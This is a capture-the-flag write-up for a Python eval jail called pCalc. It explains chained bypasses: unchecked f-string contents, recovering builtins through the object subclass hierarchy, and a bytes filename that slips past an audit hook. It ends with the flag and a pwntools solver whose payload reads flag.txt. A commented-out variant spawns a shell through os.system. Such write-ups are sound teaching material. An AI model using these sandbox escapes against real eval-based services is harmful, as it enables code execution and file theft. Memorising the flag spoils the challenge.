# pCalc

## Description
A "super secure calculator" Python jail. The server evaluates user input through `eval()` with restricted builtins (`{"__builtins__": {}}`) and an AST validator that only allows math-related nodes (BinOp, UnaryOp, Constant, Name, operator, unaryop) plus JoinedStr (f-strings). An audit hook blocks `os.system`, `os.popen`, `subprocess.Popen`, and opening files with "flag" in the name. The string "import" is also blocked in the raw input.

## Solution
Three vulnerabilities chained together:

1.  **F-string AST bypass:** The AST validator allows `JoinedStr` (f-string) nodes but does `pass` instead of recursing into children. This means arbitrary Python expressions inside `f"{...}"` are never validated.
2.  **Object hierarchy for builtins:** Since `__builtins__` is empty in the eval context, we walk Python's object hierarchy `().__class__.__mro__[1].__subclasses__()` to find a class with a Python `__init__` function, then access `__init__.__globals__['__builtins__']` to recover the full builtins dict.
3.  **Bytes path audit bypass:** The audit hook checks `isinstance(args[0], str)` and `'flag' in args[0]`. Passing the filename as bytes (`b'flag.txt'`) makes `isinstance(args[0], str)` return False, bypassing the check entirely.

The "import" filter is bypassed with string concatenation (`'__imp'+'ort__'`), though it's not even needed for the file read payload.

## Flag
`p_ctf{CHA7C4LCisJUst$HorTf0rcaLCUla70r}`

## Solver Script

```python
from pwn import *

# Context
# context.log_level = 'debug'

def solve():
    r = remote('pcalc.ctf.prgy.in', 1337)
    
    # Vulnerability: 
    # 1. f-strings in AST are not strictly validated for children nodes.
    # 2. empty __builtins__ can be recovered via object hierarchy.
    # 3. 'flag' string text check bypassed by passing bytes b'flag.txt'.
    
    # We construct a payload that does:
    # [c for c in ().__class__.__bases__[0].__subclasses__() if c.__name__ == 'WarningMessage'][0].__init__.__globals__['__builtins__']['open'](b'flag.txt').read()
    
    # Note: 'object' is ().__class__.__bases__[0] usually.
    # We need a class that has __init__ and globals. 'WarningMessage' is a good candidate often available.
    # Alternatives: any class defined in a module with os/builtins checks.
    
    # Payload construction
    # We wrap it in an f-string to bypass top-level AST check if it only checks the joined string structure but passes on content.
    # Writeup says: "means arbitrary Python expressions inside f'{...}' are never validated"
    
    # The payload needs to return a string or be printed?
    # The challenge repl probably prints the result of eval.
    
    # Let's verify the classes.
    # We can use a short one like:
    # ().__class__.__base__.__subclasses__()[100] ... 
    
    # Let's try to construct the recover payload.
    # We need to avoid "import" in the *string* itself if the filter is simple string matching.
    # The writeup mentions "import" filter bypassed with 'string' + 'concat', but we are gathering builtins so we don't need import.
    
    # Payload:
    # f"{.__class__.__base__.__subclasses__()[140].__init__.__globals__['__builtins__']['open'](b'flag.txt').read()}"
    # Wait, we need an instance to access .__class__ inside f-string? f"{ ().__class__ ... }"
    
    # The writeup says: "pass" validation for JoinedStr. 
    # So `f"{ <EXPLOIT> }"` should work.
    
    # We need to find a suitable subclass index. In many challenges, WarningMessage or catch_warnings is reliable.
    # Or just iterate.
    # But for a specific script, we might need a general find.
    # This script assumes one exists or we just use a comprehensive one.
    
    exploit_payload = (
        "f\"{"
        "[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'WarningMessage'][0]"
        ".__init__.__globals__['__builtins__']['open'](b'flag.txt').read()"
        "}\""
    )
    
    # Bypassing "import" filter for arbitrary code:
    # exploit_payload = "f\"{[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'WarningMessage'][0].__init__.__globals__['__builtins__']['__import__']('os').system('sh')}\""
    # But reading flag.txt directly is stealthier and mentioned in writeup to bypass 'flag' check.
    
    log.info(f"Sending payload: {exploit_payload}")
    r.sendlineafter(b'>>> ', exploit_payload.encode())
    
    # Output should contain the flag
    r.recvline() # Likely echo or result
    flag = r.recvline()
    print(f"[+] Flag: {flag.strip().decode()}")
    r.close()

if __name__ == "__main__":
    solve()
```

